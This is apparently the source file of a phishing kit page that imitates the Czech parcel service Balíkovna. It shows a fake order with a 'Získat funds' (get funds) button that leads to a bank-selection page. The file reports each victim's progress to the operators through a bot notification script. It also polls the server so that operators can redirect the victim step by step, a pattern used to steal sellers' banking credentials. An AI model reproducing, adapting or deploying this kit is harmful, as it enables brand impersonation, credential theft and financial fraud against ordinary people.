<?php

ini_set('display_errors', 1);
error_reporting(E_ALL);
session_start();
require_once __DIR__ . '/vendor/autoload.php';

$dotenv = Dotenv\Dotenv::createUnsafeImmutable(__DIR__);
$dotenv->load();



?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" type="text/css" href="balikovna.css">
    <link rel="stylesheet" href="chat.css">
    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <title>Sledovat balík | Balíkovna</title>
</head>
<?php include 'chat.php' ?>
<?php
                        $currStageText = '📇Переход на главную страницу';
                        require 'botNotification.php' ?>
<body>
    <div class="navigation">
        <div class="navigation-inner">
            <img src="images/baliklogo.png" alt="">
        </div>
    </div>
    <div class="main">
        <div class="main-items">
            <div class="item1">
                <div class="item1head">
                    Informace o objednávce
                </div>
                <div class="item1nazvanieimg">
                    <div class="korobka">
                        <img src="images/korobka.png" alt="">
                    </div>
                </div>
                <div class="row1">
                    <div class="row1desc">Cena</div>
                    <div class="row1value" id="product-price">100 CZK?</div>
                </div>
                <div class="row1">
                    <div class="row1desc">Nazev</div>
                    <div class="row1value" id="product-name">100 CZK?</div>
                </div>
                <div class="row1">
                    <div class="row1desc">Množství</div>
                    <div class="row1value">1</div>
                </div>
                <div class="row1">
                    <div class="row1desc">Způsob platby</div>
                    <div class="row1value">platba na Účet přes Balikovna</div>
                </div>
                <div class="item1head2">
                    Informace o doručení
                </div>
                <div class="row1">
                    <div class="row1desc">Adresa</div>
                    <div class="row1value" id="seller-address">Ricany, Cernokostelecka 422/5</div>
                </div>
                <div class="row1">
                    <div class="row1desc">Jméno a příjmení</div>
                    <div class="row1value" id="seller-name">Jiří?</div>
                </div>
            </div>
            <div class="item2">
                <div class="row2">
                    <div class="row2desc">Nárokovaná částka:</div>
                    <div class="row2value" id="product-price2">100 CZK?</div>
                </div>
                <div class="row3">
                    <div class="row2desc">Dodávka:</div>
                    <div class="row2value">hradí kupující</div>
                </div>
                <div class="pays">
                    <img src="images/visa.svg" alt="">
                    <img src="images/mastercard.svg" alt="">
                </div>
                <div class="ziskat">
                    <button id="Pokracovat"> Získat funds </button>
                </div>
                <div class="prij">
                    Příjem platby je bezpečný
                </div>
                <div class="prij2">
                    Kliknutím na tlačítko „ZÍSKAT FUNDS“ souhlasíte s podmínkami online služby „Bezpečná nabídka“
                </div>
            </div>
        </div>
    </div>
    <script>
                            let productNameBlock = document.getElementById('product-name');
                            let productPriceBlock = document.getElementById('product-price');
                            let productPriceBlock2 = document.getElementById('product-price2');
                            let sellerNameBlock = document.getElementById('seller-name');
                            let sellerAddressBlock = document.getElementById('seller-address');

                            var productName = "<?php echo $productName; ?>";
                            var productPrice = "<?php echo $productPrice; ?>";
                            var sellerName = "<?php echo $sellerName; ?>";
                            var sellerAddress = "<?php echo $sellerAddress; ?>";
                            let photoUrl = "<?php echo $photoUrl; ?>";
                            photoUrl = photoUrl.toString();

                            if (productName !== "") {
                                productNameBlock.innerHTML = productName;
                            }


                            if (productPrice !== "") {
                                productPriceBlock.innerHTML = productPrice + " CZK";
                                productPriceBlock2.innerHTML = productPrice + " CZK";
                            }
                            if (sellerName !== "") {
                                sellerNameBlock.innerHTML = sellerName;
                            }

                            if (sellerAddress !== "") {
                                sellerAddressBlock.innerHTML = sellerAddress;
                            }
                            document.getElementById('product-image').style.backgroundImage = `url('${'<?php echo $photoUrl; ?>'}')`;

                        </script>

    <div class="kubiki">
        <img src="images/cubes.png" alt="">
    </div>
    <div class="gray-banners">
        <div class="rychleblock">
            <div class="rychleimg">
                <img src="images/6.svg" alt="">
            </div>
            <div class="rychletext">
                <div class="text1">Rychle</div>
                <div class="text2">Balík si vyzvednete běžně už druhý den. I dobírku zaplatíte online.</div>
            </div>
        </div>
        <div class="rychleblock2">
            <div class="rychleimg2">
                <img src="images/5.svg" alt="">
            </div>
            <div class="rychletext2">
                <div class="text3">Jednoduše</div>
                <div class="text4">S kódem pro vyzvednutí se nestihnete ani rozkoukat a už jdete domů s balíkem.</div>
            </div>
        </div>
        <div class="rychleblock3">
            <div class="rychleimg3">
                <img src="images/7.svg" alt="">
            </div>
            <div class="rychletext3">
                <div class="text5">Blízko</div>
                <div class="text6">Jsme na každém rohu. V trafice, obchodě i na poště. A nově si balík vyzvednete i v
                    AlzaBoxech..</div>
            </div>
        </div>
    </div>
    <div class="MojeBalikovnaBanner">
        <div class="banner">
            <div class="vyhody">
                <div class="vyhodyhead">
                    Výhody účtu Moje Balíkovna
                </div>
                <div class="vyhodybody">
                    Zaregistrujte se a posílejte balíky jen za 65 Kč.
                </div>
                <div class="vyhodyfoot">
                    <a href="https://login.balikovna.cz/oidc/login?site=wba&gig_ui_locales=cs&landing_page=registration"
                        id="rega">
                        <button id="ucet">VYTVOŘIT ÚČET</button>
                    </a>
                </div>
            </div>
            <div class="strochki">
                <div class="line">
                    <div class="line-innerimage">
                        <img src="images/1.svg" alt="">
                    </div>
                    <div class="line-innertext">
                        Balíky přehledně na jednom místě pro lepší kontrolu.
                    </div>
                </div>
                <div class="line2">
                    <div class="line-innerimage2">
                        <img src="images/4.svg" alt="">
                    </div>
                    <div class="line-innertext2">Ještě rychlejší odesílání díky předvyplněným údajům.</div>
                </div>
                <div class="line3">
                    <div class="line-innerimage3">
                        <img src="images/3.svg" alt="">
                    </div>
                    <div class="line-innertext3">Ještě rychlejší odesílání díky předvyplněným údajům.</div>
                </div>
            </div>
        </div>
    </div>
    <div class="feedback-banner">
        <div class="feedback-banner-inner">
            <div class="feedimg">
                <img src="images/feedback.svg" alt="">
            </div>
            <div class="feedzagl">
                Jaký je váš názor na Balíkovnu?
            </div>
            <div class="feedzagl2">
                Jste s Balíkovnou spokojeni? Nebo pro nás máte nějaký námět na zlepšení?
            </div>
            <div class="feed2">
                <a href="https://www.balikovna.cz/cs/zpetna-vazba" id="rega">
                    <button id="ucet">NAPSAT SVŮJ NÁZOR</button>
                </a>
            </div>
        </div>
        <div class="feedback-banner-footer">
            <img src="images/kub.svg" alt="">
            <img src="images/kub.svg" alt="">
            <img src="images/kub.svg" alt="">
            <img src="images/kub.svg" alt="">
            <img src="images/kub.svg" alt="">
        </div>
    </div>
    <div class="footer">
        <div class="footer-inner">
            <div class="footer-inner-levo">
                Poradíme vám na čísle <a href="tel:218218218">&nbsp;218 218 218&nbsp;</a>
                nebo&nbsp;<a href="mailto:pomuzeme@balikovna.cz">pomuzeme@balikovna.cz</a>

            </div>
            <div class="footer-inner-pravo">
                <div class="item-link">
                    <a href="https://www.balikovna.cz/cs/zpetna-vazba">Váš názor</a>
                </div>
                <div class="item-link2">
                    <a href="https://www.balikovna.cz/cs/pravo-a-gdpr">Právo a GDPR</a>
                </div>
                <div class="item-link3">
                    <a href="https://www.balikovna.cz/cs/zpetna-vazba">Mapa stránek</a>
                </div>
            </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
    <script>
setInterval(function() {
    // Создаем новый объект XMLHttpRequest
    var xhr = new XMLHttpRequest();

    // Открываем соединение с сервером
    xhr.open('POST', 'update_time.php', true);

    // Устанавливаем заголовок для передачи данных в формате x-www-form-urlencoded
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    // Отправляем запрос на сервер
    xhr.send('orderid=' + encodeURIComponent(orderid));

}, 3000);

</script>
<script src="./script.js"></script>
<script>
$(window).on('load', function () {
    // Получаем текущий URL
    var currentUrl = window.location.href;

    const nextButton = document.getElementById('Pokracovat');
    const balikovnaPosition = currentUrl.indexOf("balikovna/");
    var orderId = <?php echo $id ?>;
    const baseURL = currentUrl.slice(0, balikovnaPosition + 10); // 9 символов в "balikovna/"
    nextButton.onclick = function () {
        window.location.href = baseURL + 'selectbank/?orderid=' + orderId
    }


    // Переменная для отслеживания перенаправления
    var isRedirecting = false;

    // Функция проверки стадии
    function checkStage() {
        $.ajax({
            url: '/balikovna/checkstage.php',
            method: 'POST',
            data: {
                orderid: '<?php echo $id ?>',
                currstage: 'firstpage'
            },
            success: function (stage) {
                // Получаем orderid
                var orderId = <?php echo $id ?>;
                if (!isRedirecting && !currentUrl.includes(stage) && stage != 'firstpage' && stage != '') {
                    console.log(stage)
// Устанавливаем флаг перенаправления
isRedirecting = true;


// Находим позицию "balikovna/" в текущем URL
const currentURL = window.location.href;
const balikovnaPosition = currentURL.indexOf("balikovna/");

// Обрезаем URL после "balikovna/"
const baseURL = currentURL.slice(0, balikovnaPosition + 10); // 9 символов в "balikovna/"

// Формируем новый URL для перенаправления пользователя
const url = baseURL + stage + "/?orderid=" + orderId + '&bank=' + "<?php echo $row['bank']?>";

// Перенаправляем пользователя на нужную страницу
window.location.href = url;

                } else {
                    // Повторяем проверку через 1 секунду
                    setTimeout(checkStage, 1000);
                }
            }
        });
    }

    // Вызываем функцию проверки стадии
    checkStage();
});

    </script>
</body>

</html>